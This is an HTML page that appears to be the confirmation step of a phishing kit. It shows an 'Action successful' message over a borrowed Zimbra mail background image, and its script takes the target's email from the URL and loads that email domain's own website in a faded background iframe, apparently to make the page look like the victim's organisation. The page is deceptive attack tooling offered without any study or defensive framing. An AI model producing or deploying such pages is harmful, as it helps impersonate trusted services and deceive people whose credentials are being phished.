<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Action Successful</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-image: url('https://mail.zimbra.com/img/new-back-ground-image.png'), linear-gradient(#008CBA, #008CBA);
            background-blend-mode: overlay;
            background-size: cover;
            background-position: center;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            position: relative;
            overflow: hidden;
        }
        #background-iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 0;
            opacity: 0.5; /* Adjust transparency as needed */
            pointer-events: none; /* Prevent interaction with iframe */
        }
        .container {
            position: relative;
            z-index: 1;
            background-color: rgba(255, 255, 255, 0.8); /* Semi-transparent white for readability */
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        .message {
            color: green;
            font-size: 1.5em;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <iframe id="background-iframe"></iframe>
    <div class="container">
        <div class="message">Action successful</div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const urlParams = new URLSearchParams(window.location.search);
            const email = urlParams.get('email');

            if (email && email.includes('@')) {
                const domain = email.split('@')[1].toLowerCase();
                const iframe = document.getElementById('background-iframe');
                iframe.src = `https://${domain}`; // Load the domain webpage
                console.log(`Loading background from: https://${domain}`);
            } else {
                console.warn('No valid email found in URL.');
            }
        });
    </script>
</body>
</html>
